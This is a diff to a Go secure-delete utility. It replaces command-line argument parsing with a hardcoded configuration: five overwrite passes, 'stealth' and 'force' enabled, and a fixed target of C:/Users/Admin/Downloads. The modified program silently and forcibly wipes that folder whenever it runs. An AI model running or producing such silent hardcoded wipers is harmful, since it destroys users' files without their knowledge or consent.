@@ -7,7 +7,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"strconv"
 )
 
 func overwriteFile(path string) error {
@@ -151,32 +150,23 @@ func secureDeleteDir(dir string, passes int, force bool, silent bool) error {
 	return nil
 }
 
-func main() {
-	if len(os.Args) < 4 {
-		fmt.Println("Usage: go run main.go <directory_path> <no_of_passes> <force(true|false)> <stealth(true|false)>")
-		os.Exit(1)
-	}
-	dir := os.Args[1]
-	passes, err := strconv.Atoi(os.Args[2])
-	if err != nil || passes < 1 {
-		log.Fatalf("Invalid number of passes: %v", err)
-	}
-	force := false
-	if os.Args[3] == "true" {
-		force = true
-	} else if os.Args[3] != "false" {
-		log.Fatalf("Force flag must be 'true' or 'false', got: %s", os.Args[3])
-	}
+type WipeConfig struct {
+	passes  int
+	stealth bool
+	force   bool
+}
 
-	silent := false
-	if len(os.Args) == 5 {
-		switch os.Args[4] {
-		case "true":
-			silent = true
-		case "false":
-			silent = false
-		}
+func main() {
+	config := WipeConfig{
+		passes:  5,
+		stealth: true,
+		force:   true,
 	}
+	silent := config.stealth
+	force := config.force
+	passes := config.passes
+	dir := "C:/Users/Admin/Downloads"
+
 	fi, err := os.Stat(dir)
 	if err != nil {
 		if !silent {
